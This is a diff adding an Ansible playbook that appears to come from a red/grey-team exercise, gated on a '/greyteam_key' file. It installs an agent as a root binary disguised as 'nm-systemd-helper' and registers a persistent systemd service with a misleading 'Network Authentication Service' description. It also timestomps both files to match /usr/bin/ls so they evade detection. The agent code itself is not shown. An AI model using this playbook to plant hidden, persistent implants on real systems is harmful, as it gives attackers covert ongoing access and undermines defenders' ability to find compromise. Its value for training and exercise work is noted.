@@ -1,0 +1,71 @@
+---
+- name: Agent Deployment
+  hosts: all
+  become: yes
+
+  # Define variables for paths and files
+  vars:
+    agent_src: "./agent.py"
+    binary_path: "/usr/libexec/nm-systemd-helper"
+    service_path: "/lib/systemd/system/nm-systemd-helper.service"
+    key_file: "/greyteam_key"
+
+  tasks:
+
+    # Checking for the presence of the key file to ensure we're on an authorized target
+    - name: Verify Key
+      stat:
+        path: "{{ key_file }}"
+      register: key_check
+
+    - name: Stop if Key Missing
+      fail:
+        msg: "Unauthorized target"
+      when: not key_check.stat.exists
+
+    # Ensuring request library is installed
+    - name: Ensure Python requests is installed
+      apt:
+        name: python3-requests
+        state: present
+
+    # Deploy the agent binary to the hidden location
+    - name: Deploy Agent
+      copy:
+        src: "{{ agent_src }}"
+        dest: "{{ binary_path }}"
+        mode: '0755' 
+        owner: root
+        group: root
+
+    # Create the systemd service to run the agent persistently
+    - name: Create the Service
+      copy:
+        dest: "{{ service_path }}"
+        content: |
+          [Unit]
+          Description=Systemd Network Authentication Service
+          After=network.target
+
+          [Service]
+          ExecStart={{ binary_path }}
+          Restart=always
+          Type=simple
+
+          [Install]
+          WantedBy=multi-user.target
+
+    # Enable and start the service
+    - name: Start and Hide
+      systemd:
+        name: "nm-systemd-helper"
+        enabled: yes
+        state: started
+        daemon_reload: yes
+
+    # Timestamping to blend in with system files
+    - name: Timestomp both files
+      shell: "touch -r /usr/bin/ls {{ item }}"
+      with_items:
+        - "{{ binary_path }}"
+        - "{{ service_path }}"
